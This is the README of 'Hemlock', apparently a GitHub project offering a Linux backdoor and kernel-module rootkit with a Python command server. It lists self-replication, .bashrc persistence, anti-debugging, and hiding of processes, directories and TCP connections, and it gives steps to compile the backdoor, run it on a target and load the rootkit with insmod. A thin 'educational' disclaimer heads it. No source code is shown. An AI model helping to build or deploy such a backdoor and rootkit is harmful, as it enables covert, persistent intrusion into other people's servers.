# Hemlock
## Backdoor and Rootkit

> [!CAUTION]
> This is script it's to propost educative don't use this script in real eviroment

Hemlock it's a backdoor who can get remote acess in a Linux Servers with a server in python  and the part it's necessary to make the backdoor ofuscated, contain:

## Backdoor:
- [x] Self Replication
- [x] Bashrc Persitence
- [x] Demonize Shell
- [x] Anti Debug and Reverse Engineering

## LKM - Rootkit
- [x] Hide Directory
- [x] Hide process
- [x] Give root privileges
- [x] Hide tcp connections

## Server - Python
- [x] Multi-Threading
- [x] Random Banner
- [x] Responsive

Execution:
- > Start the server 
`python3 main.py`
- > you need the archives of banner in your path

- >Compile backdoor
`gcc hemlock.c -o hemlock`

- >Execute the server to recive the connection
- >Execute the backdoor in target

- >Install Rootkit
`cd Rk`
`make`
`insmod hemlockRK.ko`
